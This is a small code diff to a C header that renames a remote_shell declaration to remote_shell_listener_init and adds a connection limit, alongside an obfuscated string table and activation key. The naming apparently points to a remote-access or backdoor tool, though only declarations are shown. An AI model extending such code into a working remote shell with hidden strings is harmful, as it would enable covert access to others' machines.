@@ -6,6 +6,7 @@
 #include <stdio.h>
 
 #define ACTIVATION_KEY_LEN 64
+#define MAX_CONNECTIONS 3
 
 typedef struct ObfuscatedStringTableEntry {
     uint8_t *data;
@@ -13,7 +14,7 @@ typedef struct ObfuscatedStringTableEntry {
     bool decoded;
 } ObfuscatedStringTableEntry;
 
-int remote_shell(char **env);
+int remote_shell_listener_init(char **env);
 
 void decode_strings(ObfuscatedStringTableEntry *strings, size_t len);
 
